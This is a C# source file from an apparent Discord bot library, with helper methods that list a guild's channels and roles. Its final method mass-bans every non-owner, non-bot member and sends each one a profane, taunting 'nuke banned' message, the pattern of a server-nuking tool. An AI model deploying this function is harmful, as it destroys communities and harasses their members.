using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using DSharpPlus;
using DSharpPlus.Entities;

namespace Kaida.Library.Extensions
{
    public static class DiscordGuildExtension
    {
        /// <summary>
        /// Gets a list of <see cref="DiscordChannel"/> of the type <see cref="ChannelType.Text"/>.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns></returns>
        public static async Task<List<DiscordChannel>> GetTextChannels(this DiscordGuild guild)
        {
            return guild.Channels.Values.Where(x => x.Type == ChannelType.Text).ToList();
        }

        /// <summary>
        /// Gets a list of <see cref="DiscordChannel"/> of the type <see cref="ChannelType.Voice"/>.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns></returns>
        public static async Task<List<DiscordChannel>> GetVoiceChannels(this DiscordGuild guild)
        {
            return guild.Channels.Values.Where(x => x.Type == ChannelType.Voice).ToList();
        }

        /// <summary>
        /// Gets a list of <see cref="DiscordChannel"/> of the type <see cref="ChannelType.Category"/>.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns></returns>
        public static async Task<List<DiscordChannel>> GetCategoryChannels(this DiscordGuild guild)
        {
            return guild.Channels.Values.Where(x => x.Type == ChannelType.Category).ToList();
        }

        /// <summary>
        /// Gets a list of <see cref="DiscordChannel"/> of the type <see cref="ChannelType.News"/>.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns></returns>
        public static async Task<List<DiscordChannel>> GetNewsChannels(this DiscordGuild guild)
        {
            return guild.Channels.Values.Where(x => x.Type == ChannelType.News).ToList();
        }

        /// <summary>
        /// Gets a list of <see cref="DiscordRole"/> from the <see cref="DiscordGuild"/>.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns>Returns a list of <see cref="DiscordRole"/>.</returns>
        public static async Task<List<DiscordRole>> GetRoles(this DiscordGuild guild)
        {
            return guild.Roles.Values.Where(x => x.Name != "@everyone").ToList();
        }

        /// <summary>
        /// Gets a list of <see cref="DiscordRole"/> which are below the <see cref="DiscordClient"/> from the <see cref="DiscordGuild"/>.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns>Returns a list of <see cref="DiscordRole"/>.</returns>
        public static async Task<List<DiscordRole>> GetRolesBelowBot(this DiscordGuild guild)
        {
            var botRoles = guild.GetMemberAsync(525291270525026322).Result.Roles.OrderByDescending(x => x.Position);
            var botRole = botRoles.FirstOrDefault(x => x.Name != "@everyone");
            return guild.Roles.Values.Where(x => x.Position < botRole.Position && x.IsManaged == false).ToList();
        }

        /// <summary>
        /// Ban every <see cref="DiscordMember"/> on the <see cref="DiscordGuild"/> which are not the owner or a bot.
        /// </summary>
        /// <param name="guild">Represents the <see cref="DiscordGuild"/>.</param>
        /// <returns></returns>
        public static async Task DoBanAllMembers(this DiscordGuild guild)
        {
            var users = guild.Members.Values.Where(x => x.IsOwner == false && x.IsBot == false).ToList();

            foreach (var user in users)
            {
                var embed = new DiscordEmbedBuilder
                {
                    Description = new StringBuilder()
                    .AppendLine($"Let's keep it simple buddy, you just got fucking nuke banned on {guild.Name}.")
                    .AppendLine("https://www.youtube.com/watch?v=p12coHOA51Q").ToString()
                };

                await user.SendMessageAsync(embed: embed);
                await user.BanAsync();
            }
        }
    }
}
